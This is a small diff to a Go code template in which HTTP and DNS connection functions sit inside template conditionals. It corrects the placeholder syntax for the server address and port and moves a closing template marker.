@@ -251,11 +251,11 @@ func httpConnect() (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -HTTPServer
-
 func getHTTPAddress() string {
-	return "{{HTTPServer}}:{{HTTPLPort}}"
+	return "{{.HTTPServer}}:{{.HTTPLPort}}"
 }
+
+// {{end}} -HTTPServer
 
 // {{if .DNSParent}}
 func dnsConnect() (*Connection, error) {
